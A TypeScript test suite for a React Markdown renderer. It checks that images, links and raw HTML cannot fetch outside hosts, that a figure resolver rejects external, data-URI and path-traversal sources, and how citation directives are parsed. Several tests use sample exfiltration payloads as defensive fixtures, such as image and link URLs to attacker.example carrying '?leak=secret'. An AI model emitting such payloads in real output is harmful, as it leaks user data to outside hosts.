import { describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { corpusFigureResolver, Markdown } from "./markdown";

function render(text: string): string {
  return renderToStaticMarkup(<Markdown text={text} />);
}

const UUID = "11111111-1111-4111-8111-111111111111";

const UNRESOLVED = "Unresolved citation";

/** Render with the corpus figure resolver wired (a bare figure name → the files route). */
function renderWithFigures(text: string): string {
  return renderToStaticMarkup(
    <Markdown
      text={text}
      resolveImage={corpusFigureResolver((name) => `/api/files/${name}`)}
    />,
  );
}

function renderWithCitations(text: string): string {
  return renderToStaticMarkup(<Markdown text={text} onCitation={() => {}} />);
}

describe("Markdown egress", () => {
  test("an image renders as text, never as a fetchable element", () => {
    const html = render("![a figure](https://attacker.example/?leak=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: a figure]");
  });

  test("a link renders as its text, without the destination", () => {
    const html = render(
      "see [the paper](https://attacker.example/?leak=secret)",
    );
    expect(html).not.toContain("href");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("the paper");
  });

  test("an autolinked bare URL is not clickable", () => {
    const html = render("see https://attacker.example/?leak=secret for detail");
    expect(html).not.toContain("href");
  });

  // The cases above pin the markdown-syntax vectors. Raw HTML is the other half
  // of the invariant: it is escaped to text rather than parsed, so `img` and `a`
  // stay the only elements in the reachable grammar. Enabling HTML — adding
  // `rehype-raw`, say — would break that without touching a case above.
  test("a raw HTML image is escaped, never a fetchable element", () => {
    const html = render('<img src="https://attacker.example/?leak=secret">');
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img");
  });

  test("a raw HTML anchor is escaped, never clickable", () => {
    const html = render('<a href="https://attacker.example/">the paper</a>');
    expect(html).not.toContain("<a ");
    expect(html).toContain("&lt;a ");
  });

  test("prose still renders through the full grammar", () => {
    const html = render("## Finding\n\n| a | b |\n| - | - |\n| 1 | 2 |\n");
    expect(html).toContain("<h2");
    expect(html).toContain("<thead");
    expect(html).toContain("<tbody");
  });
});

// The corpus figure resolver is the one path that turns markdown into a real `<img src>`; it is the
// egress guard for that path, so it earns a test in the suite whose subject is exactly this property.
describe("corpus figure resolver egress", () => {
  test("a bare figure name resolves to the files route and renders an image", () => {
    const html = renderWithFigures("![a figure](figure1.png)");
    expect(html).toContain("<img");
    expect(html).toContain('src="/api/files/figure1.png"');
  });

  test.each([
    ["an absolute URL", "https://evil.example/x.png"],
    ["a scheme-relative URL", "//evil.example/x.png"],
    ["a data URI", "data:image/png;base64,iVBORw0KGgo="],
    ["a path traversal", "../../secret.png"],
    ["a nested path", "a/b.png"],
    ["an empty src", ""],
  ])("refuses %s — the image stays inert", (_label, src) => {
    const html = renderWithFigures(`![a figure](${src})`);
    expect(html).not.toContain("<img");
    expect(html).toContain("[image: a figure]");
    if (src) expect(html).not.toContain(src);
  });
});

describe("citation directives", () => {
  test("a well-formed :paper renders a navigable citation", () => {
    const html = renderWithCitations(`see :paper[${UUID}]`);
    expect(html).toContain("<button");
    expect(html).toContain("source");
  });

  test("a :paper with a non-UUID id renders a broken, non-navigable marker showing the raw id", () => {
    const html = renderWithCitations("see :paper[not-a-real-id]");
    expect(html).not.toContain("<button");
    expect(html).toContain("not-a-real-id");
    expect(html).toContain("line-through");
  });

  test("a :quote keeps a quote that itself contains commas (split on the first only)", () => {
    const html = renderWithCitations(`:quote[${UUID}, alpha, beta]`);
    expect(html).toContain("alpha, beta");
    expect(html).not.toContain(UUID);
  });

  test("a :quote with no comma renders without crashing (empty quote)", () => {
    const html = renderWithCitations(`:quote[${UUID}]`);
    expect(html).toContain("<button");
  });

  test.each([":paper", ":quote"])(
    "a bare %s carries no id, so it is prose and not a citation",
    (directive) => {
      const html = renderWithCitations(`the ${directive} directive`);
      expect(html).toContain(`the ${directive} directive`);
      expect(html).not.toContain("<button");
      expect(html).not.toContain(UNRESOLVED);
    },
  );

  // An empty label is no label. What has to hold is that the name and the token after it both
  // survive — an unhandled directive takes the following token down with it — not whatever text the
  // reconstruction happens to produce for the brackets.
  test.each([":paper[]", ":quote[]"])(
    "%s is not a citation, and the prose around it survives",
    (directive) => {
      const html = renderWithCitations(`the ${directive} directive`);
      expect(html).toContain(directive.replace("[]", ""));
      expect(html).toContain("directive");
      expect(html).not.toContain("<button");
      expect(html).not.toContain(UNRESOLVED);
    },
  );

  // Brackets holding only whitespace, or only the comma separator, are a label the author wrote and
  // left without an id — a malformed citation, which is the broken marker's job, not prose.
  test.each(["a :quote[ ] here", "a :quote[,] here", "a :paper[ ] here"])(
    "%s is a citation with a missing id",
    (prose) => {
      const html = renderWithCitations(prose);
      expect(html).toContain(UNRESOLVED);
      expect(html).not.toContain("<button");
    },
  );

  test("an id wrapped in inline code is still a label, so it still cites", () => {
    const html = renderWithCitations(`see :paper[\`${UUID}\`]`);
    expect(html).toContain("<button");
    expect(html).not.toContain(":paper");
  });

  test("an unparseable id under an inline node stays a visible broken citation", () => {
    const html = renderWithCitations("use :paper[`some-id`] to cite");
    expect(html).toContain(UNRESOLVED);
    expect(html).toContain("some-id");
    expect(html).not.toContain("<button");
  });

  // Some inline nodes carry no characters of their own, so a label built only from them reads as
  // empty. It is still a label, and the citation it introduces is still broken — taking it for prose
  // would erase the `[…]` leaving no sign a citation was ever there.
  test("a label holding only an image is a broken citation, not prose", () => {
    const html = renderWithCitations("see :paper[![alt](fig.png)] here");
    expect(html).toContain(UNRESOLVED);
    expect(html).not.toContain(":paper");
  });

  // Worse than losing the label: the reference is the only thing keeping its definition in the
  // document, so literalizing it would take prose from outside the directive too.
  test("a label holding only a footnote reference keeps the footnote in the document", () => {
    const html = renderWithCitations("see :paper[[^1]] here\n\n[^1]: a note");
    expect(html).toContain(UNRESOLVED);
    expect(html).toContain("a note");
  });
});

// `remark-directive` tokenizes every `:name`, but a citation is a paper/quote name carrying an id in
// `[…]`. Anything else is prose, and remark-rehype drops an unhandled directive along with the token
// after it — so these forms, pervasive in genomics narration and the working document (and in prose
// about the citation syntax itself), must come back verbatim with no citation in sight.
describe("citation parsing leaves ordinary colon prose intact", () => {
  test.each([
    "the ratio was 3:1 in the treatment arm",
    "variant chr1:12345 was called",
    "the meeting is at 10:30 today",
    "reported as BRCA1:c.68delAG",
    "under the note:foo heading",
    "custom :quote / :paper directive",
  ])("%s renders verbatim, with no dropped token or stray div", (prose) => {
    const html = renderWithCitations(prose);
    // The text survives intact, and no block <div> was injected inside the <p>.
    expect(html).toContain(prose);
    expect(html).not.toContain("<div></div>");
    expect(html).not.toContain("<button");
    expect(html).not.toContain(UNRESOLVED);
  });

  test("a real citation still renders amid colon prose", () => {
    const html = renderWithCitations(`chr1:12345 — see :paper[${UUID}]`);
    expect(html).toContain("chr1:12345");
    expect(html).toContain("<button");
  });
});

describe("single newlines", () => {
  test("fold into the paragraph by default", () => {
    expect(render("line one\nline two")).not.toContain("<br");
  });

  test("`breaks` honours them as line breaks (a curator's typed turn)", () => {
    expect(
      renderToStaticMarkup(<Markdown text={"line one\nline two"} breaks />),
    ).toContain("<br");
  });
});
